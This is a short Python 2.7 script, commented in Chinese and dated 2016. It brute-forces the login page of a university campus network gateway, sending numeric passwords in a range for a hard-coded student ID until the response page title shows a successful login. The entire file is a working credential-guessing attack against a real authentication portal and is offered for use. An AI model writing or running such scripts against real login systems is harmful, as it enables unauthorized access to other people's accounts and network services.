#-*-coding:utf-8-*-
#---------------------------
#时间：2016年3月6日
#语言：Python2.7
#作者：Dendi
#脚本功能：暴力破解我邮校园网，仅限数字
#---------------------------

import urllib    
import urllib2
import re

url = 'http://10.3.8.211'    
key = '073'
title_pat = r'(?<=<title>).*?(?=</title>)'
title_ex = re.compile(title_pat,re.M|re.S)
headers = {
           'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64)\
            AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36',
            'Referer':'http://10.3.8.211/'}
password = ''

for i in range(700,800):   
    values = {'DDDDD' : '2013210681',    
              'upass' :  key + str(i).zfill(3),
              'savePWD' :'0',
              '0MKKey':''}
    data = urllib.urlencode(values) 
    req = urllib2.Request(url,data,headers)  
    response = urllib2.urlopen(req)
    text = response.read()
    title_obj = re.search(title_ex, text)
    if title_obj:
        s = title_obj.group()
       # print values['upass'],s
        if s == '登录成功窗':
            password = values['upass']
            break   
        else:
            pass
print 'your password is ' + password
print  'Internet has connected successfully!'